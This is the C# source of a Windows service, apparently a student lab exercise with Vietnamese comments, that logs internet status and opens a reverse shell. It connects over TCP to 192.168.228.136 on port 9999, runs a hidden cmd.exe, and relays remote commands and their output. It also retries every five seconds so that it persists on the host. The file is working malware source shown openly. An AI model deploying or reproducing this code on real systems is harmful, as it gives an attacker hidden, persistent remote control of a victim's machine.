using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.ServiceProcess;
using System.Text;
using System.Timers;

namespace LAB1_Bai3
{
    public partial class Service1 : ServiceBase
    {
        Timer timer = new Timer(); // name space(using System.Timers;) 

        public Service1()
        {
            InitializeComponent();
        }

        protected override void OnStart(string[] args)
        {
            WriteToFile("**************Start get status*******");
            RequestUrl();
            ReverseShell();
            //Lặp lại sau 5s
            timer.Elapsed += new ElapsedEventHandler(OnElapsedTime);
            timer.Interval = 5000; //number in milisecinds 
            timer.Enabled = true;  
        }

        protected override void OnStop()
        {
            WriteToFile("**************End*******");
        }

        private void OnElapsedTime(object source, ElapsedEventArgs e)
        {
            RequestUrl();
            if (check == 0) //Kiểm tra ReverseShell được tạo hay chưa. Nếu chưa thì tạo.
            {
                ReverseShell();
            }    
        }

        /// <summary>
        /// Hàm có chức năng kiểm tra trạng thái của Internet
        /// </summary>
        public void RequestUrl()
        {
            WriteToFile("Service is started at " + DateTime.Now);

            try
            {
                HttpWebRequest request = (HttpWebRequest)HttpWebRequest.Create("http://example.com/");
                request.Method = "GET";

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                //kiểm tra trạng thái của internet
                if((int)response.StatusCode >= 200 && (int)response.StatusCode < 300)
                {
                    WriteToFile("Trạng thái internet lúc " + DateTime.Now + " là " + ((int)response.StatusCode).ToString());
                }
                else
                {
                    WriteToFile("Trạng thái internet lúc " + DateTime.Now + " là " + ((int)response.StatusCode).ToString());
                }    
                
                //Close stream
                response.Close();
            }
            catch
            {
                WriteToFile(" Don't Internet");
            }
        }

        StreamWriter streamWriter;
        int check = 1; //Biến có chức năng kiểm tra ReverseShell được tạo hay chưa. Giá trị 1 là được tạo, 0 là chưa được tạo
        /// <summary>
        /// Hàm có chức năng tạo ReverShell
        /// </summary>
        public void ReverseShell()
        {
            WriteToFile("Bắt đầu tạo ReverseShell lúc: " + DateTime.Now);
            try
            {
                using (TcpClient client = new TcpClient("192.168.228.136", 9999)) //Tạo kết nối đến máy mục tiêu
                {
                    using (Stream stream = client.GetStream())
                    {
                        using (StreamReader streamReader = new StreamReader(stream)) 
                        {
                            streamWriter = new StreamWriter(stream);

                            StringBuilder strInput = new StringBuilder(); //Tạo luồng để nhận dữ liệu của  mục tiêu

                            //Tạo process chuẩn bị ReverseShell
                            Process process = new Process();
                            process.StartInfo.FileName = "cmd.exe";
                            process.StartInfo.CreateNoWindow = true;
                            process.StartInfo.UseShellExecute = false;
                            process.StartInfo.RedirectStandardOutput = true;
                            process.StartInfo.RedirectStandardInput = true;
                            process.StartInfo.RedirectStandardError = true;
                            process.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                            process.Start();
                            process.BeginOutputReadLine();

                            //Xác nhận ReverseShell đã được tạo
                            check = 1;

                            //Thực hiện nhận dữ liệu
                            while (true)
                            {
                                strInput.Append(streamReader.ReadLine());
                                process.StandardInput.WriteLine(strInput);
                                WriteToFile(strInput.ToString());
                                strInput.Remove(0, strInput.Length); //Xóa dữ liệu trong luồng để nhận dữ liệu mới
                            }
                        }
                    }
                }
            }
            catch
            {
                WriteToFile("Kết nối TCP bị lỗi");
                check = 0; //Xác nhận ReverseShell chưa được tạo
            }
        }

        /// <summary>
        /// Hàm có chức năng gửi dữ liệu câu lệnh được thực thi cho máy attacker
        /// </summary>
        /// <param name="sendingProcess"></param>
        /// <param name="outLine"></param>
        private void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            //Tạo luồng để gửi dữ liệu
            StringBuilder strOutput = new StringBuilder();

            //Kiểm tra có dữ liệu để gửi đi hay không
            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    WriteToFile(strOutput.ToString());
                    streamWriter.Flush();
                }
                catch
                {
                    WriteToFile("Lỗi trong quá trình gửi");
                    streamWriter.Close();
                }
            }
        }

        /// <summary>
        /// Hàm có chức năng ghi nội dung vào file log
        /// </summary>
        /// <param name="Message">nội dung cần ghi</param>
        public void WriteToFile(string Message)
        {
            string path = AppDomain.CurrentDomain.BaseDirectory + "\\Logs";
            if (!Directory.Exists(path))
            {
                Directory.CreateDirectory(path);
            }
            string filepath = AppDomain.CurrentDomain.BaseDirectory +
           "\\Logs\\ServiceLog_" + DateTime.Now.Date.ToShortDateString().Replace('/', '_') +
           ".txt";
            if (!File.Exists(filepath))
            {
                // Create a file to write to. 
                using (StreamWriter sw = File.CreateText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
            else
            {
                using (StreamWriter sw = File.AppendText(filepath))
                {
                    sw.WriteLine(Message);
                }
            }
        }
    }
}
